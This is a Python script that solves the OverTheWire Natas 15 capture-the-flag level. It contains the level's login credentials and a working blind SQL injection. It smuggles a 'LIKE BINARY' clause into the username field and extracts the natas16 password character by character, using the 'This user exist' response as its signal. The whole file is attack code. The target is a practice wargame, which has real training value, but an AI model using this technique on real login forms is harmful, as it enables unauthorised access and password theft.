#!/usr/bin/python
import httplib2
import urllib
 
h = httplib2.Http()
h.add_credentials('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
 
baseStr = "";
char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
MAX = len(char)

index = 0
while index < MAX:
	query = urllib.urlencode(dict(username="natas16\" AND password LIKE BINARY \"" + baseStr + char[index] + "%\" ;# "))
	resp, content = h.request("http://natas15.natas.labs.overthewire.org/index.php?" + query, method="POST")
	if ("This user exist" in str(content)):
		baseStr += char[index];
		print("New Password: " + baseStr)
		index = 0
		continue
	index += 1
